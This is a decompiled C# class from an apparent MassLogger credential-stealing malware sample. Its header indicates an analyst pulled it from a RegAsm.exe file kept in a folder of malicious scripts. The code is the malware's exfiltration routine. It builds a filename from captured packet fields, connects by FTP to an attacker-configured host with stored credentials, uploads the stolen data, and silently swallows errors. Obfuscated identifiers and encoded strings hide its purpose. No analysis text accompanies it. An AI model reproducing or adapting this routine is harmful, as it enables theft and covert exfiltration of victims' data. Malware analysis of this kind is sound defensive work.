// Decompiled with JetBrains decompiler
// Type: UWB.fWq
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using MassLoggerClient.Core;
using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using VW1;

namespace UWB
{
  internal class fWq
  {
    internal static fWq OaN;

    public void uCp(Packet _param1)
    {
      try
      {
        if (!Convert.ToBoolean(XWr.FtpEnable))
          return;
        string str = (string) fWq.ka1((object) (JC.bx((object) _param1, JC.xIn) + w4.bx(13008, w4.vY) + JC.bx((object) _param1, JC.kIw) + w4.bx(13008, w4.vY) + JC.bx((object) _param1, JC.JI0) + w4.bx(13008, w4.vY) + JC.bx((object) _param1, JC.nI2)).Replace(w4.bx(644, w4.vY), w4.bx(13008, w4.vY)), (object) w4.bx(5046, w4.vY), (object) w4.bx(286, w4.vY)) + w4.bx(13014, w4.vY);
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(XWr.FtpHost + w4.bx(280, w4.vY) + str);
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(XWr.FtpUser, XWr.FtpPass);
        ftpWebRequest.Method = w4.bx(13026, w4.vY);
        byte[] bytes = Encoding.UTF8.GetBytes(JC.bx((object) _param1, JC.OIF));
        Stream requestStream = ftpWebRequest.GetRequestStream();
        try
        {
          requestStream.Write(bytes, 0, bytes.Length);
        }
        finally
        {
          if (requestStream != null)
            fWq.oa0((object) requestStream);
        }
      }
      catch (Exception ex)
      {
      }
    }

    public fWq()
    {
      yd.bx(yd.EI);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static object ka1([In] object obj0, [In] object obj1, [In] object obj2) => (object) ((string) obj0).Replace((string) obj1, (string) obj2);

    internal static void oa0([In] object obj0) => ((IDisposable) obj0).Dispose();

    internal static bool Ga7() => fWq.OaN == null;

    internal static fWq Nah() => fWq.OaN;
  }
}
